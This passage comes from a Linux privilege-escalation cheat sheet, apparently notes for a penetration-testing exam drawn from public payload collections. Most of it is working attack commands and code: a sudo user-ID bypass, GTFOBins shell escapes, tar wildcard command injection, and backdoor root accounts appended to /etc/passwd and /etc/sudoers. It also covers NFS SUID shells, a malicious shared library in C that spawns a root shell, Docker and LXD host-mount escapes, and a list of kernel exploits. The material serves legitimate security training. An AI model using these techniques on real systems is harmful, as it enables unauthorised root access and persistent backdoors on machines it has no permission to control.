<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Exploitable when a user have the following permissions (sudo -l)</span>
(ALL, !root) ALL

<span style="color:#75715e"># If you have a full TTY, you can exploit it like this</span>
sudo -u<span style="color:#75715e">#-1 /bin/bash</span>
sudo -u<span style="color:#75715e">#4294967295 id</span>
</code></pre></div><h2 id="gtfobins">GTFOBins</h2>
<p><a href="https://gtfobins.github.io">GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
<blockquote>
<p>gdb -nx -ex &lsquo;!sh&rsquo; -ex quit <br>
sudo mysql -e &lsquo;! /bin/sh&rsquo; <br>
strace -o /dev/null /bin/sh <br>
sudo awk &lsquo;BEGIN {system(&quot;/bin/sh&quot;)}&rsquo;</p>
</blockquote>
<h2 id="wildcard">Wildcard</h2>
<p>By using tar with â€“checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. â€œTrickingâ€ root to use the specific options is quite easy, and that&rsquo;s where the wildcard comes in handy.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># create file for exploitation</span>
touch -- <span style="color:#e6db74">&#34;--checkpoint=1&#34;</span>
touch -- <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
echo <span style="color:#e6db74">&#34;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&#34;</span> &gt; shell.sh

<span style="color:#75715e"># vulnerable script</span>
tar cf archive.tar *
</code></pre></div><p>Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>
<h2 id="writable-files">Writable files</h2>
<p>List world writable files on the system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">find / -writable ! -user `whoami` -type f ! -path <span style="color:#e6db74">&#34;/proc/*&#34;</span> ! -path <span style="color:#e6db74">&#34;/sys/*&#34;</span> -exec ls -al {} \; 2&gt;/dev/null
find / -perm -2 -type f 2&gt;/dev/null
find / ! -path <span style="color:#e6db74">&#34;*/proc/*&#34;</span> -perm -2 -type f -print 2&gt;/dev/null
</code></pre></div><h3 id="writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</h3>
<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">NAME=Network /bin/id  &amp;lt;= Note the blank space
ONBOOT=yes
DEVICE=eth0

EXEC <span style="color:#960050;background-color:#1e0010">:</span>
./etc/sysconfig/network-scripts/ifcfg-1337
</code></pre></div><p>src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f]
(<a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a>)</p>
<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
<p>First generate a password with one of the following commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c <span style="color:#e6db74">&#39;import crypt; print crypt.crypt(&#34;hacker&#34;, &#34;$6$salt&#34;)&#39;</span>
</code></pre></div><p>Then add the user <code>hacker</code> and add the generated password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">hacker<span style="color:#960050;background-color:#1e0010">:</span>GENERATED_PASSWORD_HERE<span style="color:#960050;background-color:#1e0010">:</span>0<span style="color:#960050;background-color:#1e0010">:</span>0<span style="color:#960050;background-color:#1e0010">:</span>Hacker<span style="color:#960050;background-color:#1e0010">:</span>/root<span style="color:#960050;background-color:#1e0010">:</span>/bin/bash
</code></pre></div><p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
<p>Alternatively you can use the following lines to add a dummy user without a password. <br>
WARNING: you might degrade the current security of the machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">echo <span style="color:#e6db74">&#39;dummy::0:0::/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
su - dummy
</code></pre></div><p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p>
<h3 id="writable-etcsudoers">Writable /etc/sudoers</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">echo <span style="color:#e6db74">&#34;username ALL=(ALL:ALL) ALL&#34;</span>&gt;&gt;/etc/sudoers

<span style="color:#75715e"># use SUDO without password</span>
echo <span style="color:#e6db74">&#34;username ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt;/etc/sudoers
echo <span style="color:#e6db74">&#34;username ALL=NOPASSWD: /bin/bash&#34;</span> &gt;&gt;/etc/sudoers
</code></pre></div><h2 id="exploiting-services">Exploiting Services</h2>
<p>Itâ€™s always worth checking services because you might find a version that has a PoC exploit available.</p>
<p>You might also find internal services that can be accessed by port forwarding.</p>
<h3 id="services-manual-enumeration">Services manual enumeration</h3>
<p>Search for services running as root:</p>
<p><code>ps aux | grep &quot;^root&quot;</code></p>
<p>Enumerate version details:</p>
<p><code>&lt;SERVICE&gt; --version</code>
or
<code>dpkg -l | grep &lt;SERVICE&gt;</code>
or
<code>rpm -qa | grep &lt;SERVICE&gt;</code></p>
<h3 id="automatic-enumeration">Automatic enumeration</h3>
<p>lse.sh:</p>
<p><code>./lse.sh -l 1 -i</code>
Check for services like MySQL. Can you login as root wtihout password?
Run service versions through searchsploit to check for PoC exploits.</p>
<h3 id="port-forwarding">Port forwarding</h3>
<p>Port forwarding is something you definitely need to be able to do for your exam.
I found it a bit confusing at first but once you get the concept itâ€™s quite straight forward.
Run netstat to check for open internal ports:</p>
<p><code>netstat -nl</code></p>
<p>Port forward via SSH:
<code>ssh -R &lt;KALI-PORT&gt;:127.0.0.1:&lt;SERVICE-PORT&gt; &lt;KALI-USERNAME&gt;@&lt;KALI-IP&gt;</code>
Example: <code>ssh -R 5555:127.0.0.1:3306 root@10.10.10.10</code></p>
<h2 id="nfs-root-squashing">NFS Root Squashing</h2>
<p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># remote check the name of the folder</span>
showmount -e 10.10.10.10

<span style="color:#75715e"># create dir</span>
mkdir /tmp/nfsdir  

<span style="color:#75715e"># mount directory </span>
mount -t nfs 10.10.10.10<span style="color:#960050;background-color:#1e0010">:</span>/shared /tmp/nfsdir    
cd /tmp/nfsdir

<span style="color:#75715e"># copy wanted shell </span>
cp /bin/bash . 	

<span style="color:#75715e"># set suid permission</span>
chmod +s bash 	
</code></pre></div><h2 id="shared-library">Shared Library</h2>
<h3 id="ldconfig">ldconfig</h3>
<p>Identify shared libraries with <code>ldd</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
</code></pre></div><p>Create a library in <code>/tmp</code> and activate the path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">gcc <span style="color:#960050;background-color:#1e0010">â€“</span>Wall <span style="color:#960050;background-color:#1e0010">â€“</span>fPIC <span style="color:#960050;background-color:#1e0010">â€“</span>shared <span style="color:#960050;background-color:#1e0010">â€“</span>o vulnlib.so /tmp/vulnlib.c
echo <span style="color:#e6db74">&#34;/tmp/&#34;</span> &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
/opt/binary
</code></pre></div><h3 id="rpath">RPATH</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ readelf -d flag15 | egrep <span style="color:#e6db74">&#34;NEEDED|RPATH&#34;</span>
 0x00000001 (NEEDED)                     Shared library<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">[libc.so.6]</span>
 0x0000000f (RPATH)                      Library rpath<span style="color:#960050;background-color:#1e0010">:</span> [/var/tmp/flag15]

level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =&gt;  (0x0068c000)
 libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
</code></pre></div><p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =&gt;  (0x005b0000)
 libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
</code></pre></div><p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#include&lt;stdlib.h&gt;</span>
<span style="color:#75715e">#define SHELL &#34;/bin/sh&#34;</span>

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
</code></pre></div><h2 id="groups">Groups</h2>
<h3 id="docker">Docker</h3>
<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; docker run -it --rm -v $PWD:/mnt bash
$&gt; echo <span style="color:#e6db74">&#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#39;</span> &gt;&gt; /mnt/etc/passwd
</code></pre></div><p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">docker run --rm -it --pid=host --net=host --privileged -v /<span style="color:#960050;background-color:#1e0010">:</span>/host ubuntu bash
</code></pre></div><p>Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ docker run -v /<span style="color:#960050;background-color:#1e0010">:</span>/hostOS -i -t chrisfosterelli/rootplease
latest<span style="color:#960050;background-color:#1e0010">:</span> Pulling from chrisfosterelli/rootplease
2de59b831a23<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
354c3661655e<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
91930878a2d7<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
a3ed95caeb02<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
489b110c54dc<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
Digest<span style="color:#960050;background-color:#1e0010">:</span> sha256<span style="color:#960050;background-color:#1e0010">:</span>07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status<span style="color:#960050;background-color:#1e0010">:</span> Downloaded newer image <span style="color:#66d9ef">for</span> chrisfosterelli/rootplease<span style="color:#960050;background-color:#1e0010">:</span>latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0<span style="color:#75715e"># id</span>
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>More docker privilege escalation using the Docker Socket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -v /<span style="color:#960050;background-color:#1e0010">:</span>/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
</code></pre></div><h3 id="lxclxd">LXC/LXD</h3>
<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">â•­â”€</span>swissky@lab ~  
<span style="color:#960050;background-color:#1e0010">â•°â”€</span>$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
</code></pre></div><p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># build a simple alpine image</span>
git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

<span style="color:#75715e"># import the image</span>
lxc image import ./alpine.tar.gz --alias myimage

<span style="color:#75715e"># run the image</span>
lxc init myimage mycontainer -c security.privileged=true

<span style="color:#75715e"># mount the /root into the image</span>
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

<span style="color:#75715e"># interact with the container</span>
lxc start mycontainer
lxc exec mycontainer /bin/sh
</code></pre></div><p>Alternatively <a href="https://github.com/initstring/lxd_root">https://github.com/initstring/lxd_root</a></p>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<p>Precompiled exploits can be found inside these repositories, run them at your own risk !</p>
<ul>
<li><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a></li>
<li><a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></li>
</ul>
<p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p>
<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
Copy the kernel version and distribution, and search for it in google or in <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>.</p>
<h3 id="cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</h3>
<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># make dirtycow stable</span>
echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
</code></pre></div><h3 id="cve-2010-3904-rds">CVE-2010-3904 (RDS)</h3>
<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/15285/
</code></pre></div><h3 id="cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</h3>
<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/15704/
</code></pre></div><h3 id="cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</h3>
<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/18411
</code></pre></div><h3 id="list">LIST</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*2.6.32-21-genaric-pae https<span style="color:#960050;background-color:#1e0010">:</span>//raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -m32 -pthread dirty.c -o dirty2 -lcrypt
*linux2421		- Linux 2.4.7(crashed)
*9.0 (28718.c)		- FreeBSD 9.0
*centsos45 (9542.c)	- CentOS 4.4 - 4.5 (Linux 2.6 - 2.6.19)
*linux26 (5093.c)	- Linux (2.6.23 - 2.6.24)
*18411.c		- Linux 2.6.39 &lt; 3.2.2 (Ubuntu 11.10, kernel 3.0.0-12)
*37292.c(ubuntu)	- ubuntu 14.04 (Linux 3.13 - 3.19)
Linux Kernel 2.6.17 &lt; 2.6.24.1	5092
Linux Kernel 2.4/2.6	9479
CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)	9542
RDS Protocol<span style="color:#e6db74">&#39; Local Privilege Escalation	15285
</span><span style="color:#e6db74">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation	28718
</span><span style="color:#e6db74">Apport/Abrt (Ubuntu / Fedora)	36746
</span><span style="color:#e6db74">Ubuntu 12.04/14.04/14.10/15.04	37292
</span><span style="color:#e6db74">Ubuntu 14.04/15.10	39166
</span><span style="color:#e6db74">Stapler	Ubuntu 16.04	39772
</span><span style="color:#e6db74">Dirty COW	40616
</span><span style="color:#e6db74">Dirty COW /proc/self/mem&#39;</span> Race Condition	40847
GNU Screen 4.5.0	41154
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free	41458
Ubuntu 14.04/16.04 (KASLR / SMEP)	43418
Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4)	44298
Linux Kernel 2.6	8478
Dirty COW	40616
GUnet OpenEclass E-learning platform 1.7.3	48106
Dirty COW	40839
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - <span style="color:#e6db74">&#39;overlayfs&#39;</span>	37292
Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27)	45010
</code></pre></div><h2 id="references">References</h2>
<p>-<a href="https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/#Sudo_LD_LIBRARY_PATH_Privilege_Escalation">https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/</a>
-<a href="https://github.com/Ignitetechnologies/Privilege-Escalation">https://github.com/Ignitetechnologies/Privilege-Escalation</a>
-<a href="https://www.hackingarticles.in/category/privilege-escalation/">https://www.hackingarticles.in/category/privilege-escalation/</a></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources</a></li>
<li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
